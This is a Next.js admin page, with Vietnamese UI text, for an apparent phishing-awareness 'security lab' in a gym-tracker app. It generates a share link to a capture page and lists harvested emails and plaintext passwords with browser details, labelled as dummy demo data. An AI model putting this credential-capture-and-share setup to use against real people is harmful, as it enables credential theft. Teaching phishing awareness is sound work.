'use client'

import { useEffect, useState } from 'react'
import Link from 'next/link'
import { createClient } from '../../../utils/supabase/client'

type Capture = {
  id: string
  owner_user_id: string
  email: string
  demo_password: string
  captured_at: string
  user_agent: string | null
}

export default function SecurityLabAdminPage() {
  const supabase = createClient()
  const [captures, setCaptures] = useState<Capture[]>([])
  const [message, setMessage] = useState('Loading...')
  const [shareUrl, setShareUrl] = useState('')

  const load = async () => {
    const { data: userData } = await supabase.auth.getUser()
    const user = userData.user

    if (!user) {
      setMessage('Bạn cần đăng nhập GymTracker trước để xem Lab Admin.')
      return
    }

    setShareUrl(`${window.location.origin}/security-lab?owner=${user.id}`)

    const { data, error } = await supabase
      .from('security_lab_captures')
      .select('*')
      .order('captured_at', { ascending: false })

    if (error) {
      setMessage(`Không đọc được lab database: ${error.message}`)
      return
    }

    setCaptures((data || []) as Capture[])
    setMessage('')
  }

  useEffect(() => {
    load()
  }, [])

  const clear = async () => {
    const { error } = await supabase
      .from('security_lab_captures')
      .delete()
      .not('id', 'is', null)

    if (error) {
      setMessage(`Không xóa được: ${error.message}`)
      return
    }

    setCaptures([])
    setMessage('Đã xóa demo captures của lab này.')
  }

  const copyShareLink = async () => {
    if (!shareUrl) return
    await navigator.clipboard.writeText(shareUrl)
    setMessage('Đã copy share link.')
  }

  return (
    <main className="min-h-screen bg-slate-950 px-4 py-10 text-slate-100">
      <div className="mx-auto max-w-4xl">
        <div className="mb-6 flex flex-wrap items-center justify-between gap-3">
          <Link href="/security-lab" className="text-sm text-slate-400 hover:text-white">← Security Lab</Link>
          <div className="flex gap-2">
            <button onClick={copyShareLink} className="rounded-lg border border-emerald-800 px-3 py-2 text-sm text-emerald-300 hover:bg-emerald-950/40">
              Copy share link
            </button>
            <button onClick={clear} className="rounded-lg border border-red-900 px-3 py-2 text-sm text-red-400 hover:bg-red-950/40">
              Clear captures
            </button>
          </div>
        </div>

        <section className="rounded-2xl border border-slate-800 bg-slate-900 p-6">
          <p className="text-xs font-semibold uppercase tracking-widest text-red-400">Lab Admin</p>
          <h1 className="mt-2 text-2xl font-bold">Cross-device dummy captures</h1>
          <p className="mt-2 text-sm text-slate-400">
            Chỉ chủ lab đang đăng nhập mới đọc được rows của mình qua Supabase RLS.
          </p>

          {shareUrl && (
            <p className="mt-4 break-all rounded-xl bg-slate-950 p-3 font-mono text-xs text-slate-400">{shareUrl}</p>
          )}

          {message && (
            <div className="mt-4 rounded-xl border border-slate-700 bg-slate-950 p-3 text-sm text-slate-300">
              {message}
            </div>
          )}

          <div className="mt-6 space-y-3">
            {!message && captures.length === 0 ? (
              <div className="rounded-xl border border-dashed border-slate-700 py-10 text-center text-slate-500">
                Chưa có demo capture nào.
              </div>
            ) : (
              captures.map((capture) => (
                <article key={capture.id} className="rounded-xl border border-slate-800 bg-slate-950 p-4">
                  <div className="grid gap-3 sm:grid-cols-2">
                    <div>
                      <p className="text-xs text-slate-500">Demo email</p>
                      <p className="font-mono text-sm">{capture.email}</p>
                    </div>
                    <div>
                      <p className="text-xs text-slate-500">Demo password</p>
                      <p className="font-mono text-sm text-red-300">{capture.demo_password}</p>
                    </div>
                    <div>
                      <p className="text-xs text-slate-500">Captured at</p>
                      <p className="text-sm">{new Date(capture.captured_at).toLocaleString()}</p>
                    </div>
                    <div>
                      <p className="text-xs text-slate-500">Browser / user agent</p>
                      <p className="break-all text-xs text-slate-400">{capture.user_agent || 'Unknown'}</p>
                    </div>
                  </div>
                </article>
              ))
            )}
          </div>
        </section>
      </div>
    </main>
  )
}
